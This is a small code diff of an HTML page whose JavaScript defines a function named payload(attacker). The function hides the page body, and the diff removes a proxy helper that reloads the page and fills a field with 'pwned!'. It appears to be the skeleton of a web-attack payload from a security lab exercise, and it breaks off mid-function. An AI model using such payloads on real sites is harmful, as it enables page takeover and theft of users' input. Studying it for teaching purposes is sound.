@@ -3,15 +3,7 @@
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
 </script>
 <script>
-// Extend this function:
 function payload(attacker) {
-  function proxy(href) {
-    $("html").load(href, function(){
-      $("html").show();
-      $("#query").val("pwned!");
-    });
-  }
-
   $('body').children().hide();
   
   var queryUsername = "";
